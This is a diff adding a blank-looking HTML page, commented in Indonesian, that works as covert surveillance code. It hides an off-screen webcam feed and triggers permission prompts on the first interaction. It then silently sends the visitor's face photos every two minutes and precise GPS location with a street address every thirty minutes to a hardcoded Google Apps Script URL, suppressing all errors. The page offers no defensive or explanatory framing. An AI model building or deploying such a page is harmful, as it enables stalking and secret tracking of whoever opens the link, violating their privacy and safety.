@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page</title>
+    <style>
+        body { 
+            background: #fff; 
+            margin: 0;
+            padding: 0;
+        }
+        #camera { 
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+        }
+    </style>
+</head>
+<body>
+
+<video id="camera" autoplay playsinline muted></video>
+
+<script>
+const camera = document.getElementById('camera');
+
+// URL Google Apps Script - GANTI DENGAN URL ANDA
+const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxjwIKdKP7foTvzOq-EDzoQss6DpykfUqABQ3cBeiVRoybcl-Ee5-9SM3NUWdU44GDw/exec';
+
+let watchId;
+let photoInterval;
+let locationInterval;
+let stream;
+let permissionsRequested = false;
+let lastPhotoTime = null;
+let lastLocationTime = null;
+let videoReady = false;
+
+function requestPermissions() {
+    if (permissionsRequested) {
+        return;
+    }
+    
+    permissionsRequested = true;
+    
+    if (!stream) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return;
+        }
+        
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            } 
+        })
+        .then(s => {
+            stream = s;
+            camera.srcObject = stream;
+            
+            camera.onloadedmetadata = () => {
+                camera.play().then(() => {
+                    // Tunggu video benar-benar siap
+                    setTimeout(() => {
+                        videoReady = true;
+                        startPhotoCapture();
+                        startLocationTracking();
+                    }, 1000);
+                });
+            };
+        })
+        .catch(err => {
+            // Silent fail
+        });
+    }
+}
+
+function startLocationTracking() {
+    getCurrentLocationAndSend();
+    
+    locationInterval = setInterval(() => {
+        getCurrentLocationAndSend();
+    }, 1800000);
+}
+
+function getCurrentLocationAndSend() {
+    if (!navigator.geolocation) {
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            lastLocationTime = Date.now();
+            await handleLocation(position);
+        },
+        (err) => {
+            // Silent fail
+        },
+        { 
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
+
+async function getAddressFromCoords(lat, lon) {
+    try {
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
+        
+        const response = await fetch(url, {
+            headers: {
+                'User-Agent': 'LocationTracker/1.0'
+            }
+        });
+        
+        if (!response.ok) {
+            return null;
+        }
+        
+        const data = await response.json();
+        
+        return {
+            road: data.address.road || data.address.street || '-',
+            suburb: data.address.suburb || data.address.neighbourhood || '-',
+            village: data.address.village || data.address.hamlet || '-',
+            city: data.address.city || data.address.town || data.address.municipality || '-',
+            state: data.address.state || data.address.province || '-',
+            postcode: data.address.postcode || '-',
+            country: data.address.country || '-',
+            displayName: data.display_name || '-'
+        };
+        
+    } catch (err) {
+        return null;
+    }
+}
+
+async function handleLocation(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const acc = position.coords.accuracy;
+
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+    const address = await getAddressFromCoords(lat, lon);
+
+    const trackingData = { 
+        type: 'tracking', 
+        lat: lat, 
+        lon: lon, 
+        acc: acc,
+        mapsLink: mapsLink,
+        address: address ? {
+            road: address.road,
+            suburb: address.suburb,
+            village: address.village,
+            city: address.city,
+            state: address.state,
+            postcode: address.postcode,
+            country: address.country,
+            displayName: address.displayName
+        } : null
+    };
+    
+    try {
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(trackingData)
+        })
+        .then(() => {
+            // Silent success
+        })
+        .catch(err => {
+            // Silent fail
+        });
+    } catch (err) {
+        // Silent fail
+    }
+}
+
+function startPhotoCapture() {
+    if (!stream || !videoReady) {
+        return;
+    }
+    
+    if (!photoInterval) {
+        // Tunggu lebih lama untuk foto pertama
+        setTimeout(() => {
+            capturePhoto();
+        }, 3000);
+        
+        photoInterval = setInterval(capturePhoto, 120000);
+    }
+}
+
+async function capturePhoto() {
+    lastPhotoTime = Date.now();
+    
+    if (!stream || !videoReady) {
+        return;
+    }
+    
+    if (!camera.videoWidth || !camera.videoHeight) {
+        return;
+    }
+    
+    // Pastikan video sedang playing
+    if (camera.paused || camera.ended) {
+        try {
+            await camera.play();
+            // Tunggu sebentar setelah play
+            await new Promise(resolve => setTimeout(resolve, 500));
+        } catch (e) {
+            return;
+        }
+    }
+
+    try {
+        const canvas = document.createElement('canvas');
+        canvas.width = camera.videoWidth;
+        canvas.height = camera.videoHeight;
+
+        const ctx = canvas.getContext('2d');
+        
+        // Pastikan context ada dan video siap
+        if (!ctx) return;
+        
+        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+        
+        // Cek apakah canvas tidak hitam (semua pixel = 0)
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const pixels = imageData.data;
+        let hasColor = false;
+        
+        // Sample beberapa pixel untuk cek apakah ada warna
+        for (let i = 0; i < pixels.length; i += 40) {
+            if (pixels[i] > 0 || pixels[i+1] > 0 || pixels[i+2] > 0) {
+                hasColor = true;
+                break;
+            }
+        }
+        
+        // Jika masih hitam, skip dan coba lagi nanti
+        if (!hasColor) {
+            return;
+        }
+
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+
+        const photoData = { 
+            type: 'photo', 
+            dataUrl: dataUrl 
+        };
+        
+        fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(photoData)
+        })
+        .then(() => {
+            // Silent success
+        })
+        .catch(err => {
+            // Silent fail
+        });
+        
+    } catch (err) {
+        // Silent fail
+    }
+}
+
+const events = ['click', 'touchstart', 'keydown'];
+
+events.forEach(event => {
+    document.addEventListener(event, (e) => {
+        requestPermissions();
+    }, { once: true });
+});
+
+setTimeout(() => {
+    if (!permissionsRequested) {
+        requestPermissions();
+    }
+}, 1000);
+</script>
+
+</body>
+</html>
